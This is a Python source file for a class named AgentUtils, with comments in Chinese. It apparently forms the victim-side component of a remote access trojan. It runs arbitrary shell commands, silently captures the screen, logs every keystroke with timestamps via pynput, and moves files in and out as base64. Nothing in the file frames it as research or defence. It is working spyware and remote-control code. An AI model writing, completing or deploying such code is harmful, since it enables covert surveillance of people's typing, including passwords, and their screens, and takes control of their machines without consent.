import subprocess
import os
import base64
from PIL import ImageGrab
import tempfile
from pynput import keyboard
import threading
import json
import time
from datetime import datetime

class AgentUtils:
    def __init__(self):
        self.keystrokes = []
        self.keyboard_listener = None
        self.is_logging = False

    def execute_command(self, command):
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            stdout, stderr = process.communicate()
            return {
                'status': 'success',
                'stdout': stdout,
                'stderr': stderr,
                'exit_code': process.returncode
            }
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }

    def take_screenshot(self):
        try:
            # 创建临时文件
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.png')
            temp_filename = temp_file.name
            temp_file.close()

            # 获取屏幕截图
            screenshot = ImageGrab.grab()
            screenshot.save(temp_filename)

            # 读取图片并转换为base64
            with open(temp_filename, 'rb') as image_file:
                encoded_image = base64.b64encode(image_file.read()).decode('utf-8')

            # 删除临时文件
            os.unlink(temp_filename)

            return {
                'status': 'success',
                'image_data': encoded_image,
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }

    def on_press(self, key):
        try:
            key_data = {
                'timestamp': datetime.now().isoformat(),
                'key': str(key)
            }
            self.keystrokes.append(key_data)
        except Exception:
            pass

    def start_keylogger(self):
        if not self.is_logging:
            self.is_logging = True
            self.keyboard_listener = keyboard.Listener(on_press=self.on_press)
            self.keyboard_listener.start()
            return {'status': 'success', 'message': 'Keylogger started'}
        return {'status': 'error', 'message': 'Keylogger already running'}

    def stop_keylogger(self):
        if self.is_logging:
            self.is_logging = False
            if self.keyboard_listener:
                self.keyboard_listener.stop()
            keystrokes_copy = self.keystrokes.copy()
            self.keystrokes.clear()
            return {
                'status': 'success',
                'keystrokes': keystrokes_copy
            }
        return {'status': 'error', 'message': 'Keylogger not running'}

    def upload_file(self, file_path, content):
        try:
            # 解码base64内容
            file_content = base64.b64decode(content)
            
            # 确保目标目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # 写入文件
            with open(file_path, 'wb') as f:
                f.write(file_content)
            
            return {
                'status': 'success',
                'message': f'File uploaded successfully to {file_path}'
            }
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }

    def download_file(self, file_path):
        try:
            if not os.path.exists(file_path):
                return {
                    'status': 'error',
                    'message': 'File not found'
                }
            
            with open(file_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
            
            return {
                'status': 'success',
                'filename': os.path.basename(file_path),
                'content': content
            }
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            } 